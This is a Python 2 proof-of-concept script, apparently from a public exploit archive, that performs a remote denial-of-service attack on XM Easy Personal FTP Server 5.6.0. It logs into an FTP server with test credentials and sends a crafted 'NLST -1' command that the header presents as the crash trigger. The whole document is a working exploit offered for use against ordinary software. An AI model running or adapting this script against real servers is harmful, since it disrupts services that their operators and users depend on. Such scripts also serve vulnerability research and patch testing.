print "--------------------------------------------------------------"
print "# XM Easy Personal FTP Server 5.6.0 Remote Denial of Service"
print "# url: http://www.dxm2008.com/"
print "# author: shinnai"
print "# mail: shinnai[at]autistici[dot]org"
print "# site: http://www.shinnai.net"
print "--------------------------------------------------------------"

import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   conn = s.connect(("127.0.0.1",21))
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)

   s.send('USER test\r\n')
   print "Client -> USER: test"
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)

   s.send('PASS test\r\n')
   print "Client -> PASS: test"
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)

   s.send('NLST -1\r\n')
   print "Client -> NSLT: -1"
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)
except:
   print "- Unable to connect. exiting."
